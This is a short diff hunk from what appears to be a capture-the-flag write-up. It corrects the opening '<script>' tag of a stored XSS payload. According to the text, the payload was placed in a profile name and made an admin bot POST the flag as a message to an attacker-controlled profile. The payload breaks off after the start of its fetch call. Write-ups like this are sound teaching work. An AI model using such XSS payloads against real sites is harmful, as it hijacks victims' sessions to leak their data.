@@ -56,7 +56,7 @@
 <p align="justify">The payload below triggered the bot, forcing it to send the flag in message on a controlled profile. Once the profile created with the payload as name, as mentionned in the articles released by Administrator, it was necessary to publish an article and get a visit from the bot. </p>
 
 ````javascript
-script>
+<script>
   fetch('http://localhost:3000/sendmessage', {
     method: 'POST',
     headers: {
